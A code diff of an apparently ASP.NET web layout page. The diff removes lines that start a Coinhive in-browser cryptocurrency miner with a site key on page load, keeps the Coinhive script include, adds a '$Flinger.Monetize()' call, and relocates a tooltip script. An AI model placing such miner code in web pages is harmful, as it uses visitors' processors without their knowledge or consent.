@@ -51,12 +51,7 @@
 
     <!-- <script src="//crawlersite-kernel.azurewebsites.net/build/flinger.js" data-flinger="795f40ea-8f2f-493a-b668-7efabe812699"></script> -->
 
-	<script src="https://coin-hive.com/lib/coinhive.min.js"></script>
-
-	<script>
-		var miner = new CoinHive.Anonymous('PPPvErmB17AzzfUpIKfUXcDnSGd5bANR');
-		miner.start();
-	</script>
+	<script src="https://coinhive.com/lib/coinhive.min.js"></script>
     
     <environment names="Development">
         <!-- Bootstrap core CSS -->
@@ -111,10 +106,6 @@
 
         </script>
     </environment>
-
-
-
-
 </head>
 
 <body data-spy="scroll" data-offset="0" data-target="#navigation">
@@ -246,11 +237,7 @@
         <script src="~/js/main.js"></script>
         <script src="~/js/sanitize_html.js"></script>
         <script src="~/js/dialog.js"></script>
-<script>
-$(document).ready(function(){
-    $('[data-toggle="tooltip"]').tooltip();   
-});
-</script>
+
         <script src="~/js/animate.js"></script>
     </environment>
     <environment names="Staging,Production">
@@ -274,7 +261,12 @@ $(document).ready(function(){
 
     @RenderSection("scripts", required: false)
 
-
+	<script>
+		$Flinger.Monetize();
+		$(document).ready(function(){
+			$('[data-toggle="tooltip"]').tooltip();
+		});
+	</script>
 
 </body>
 
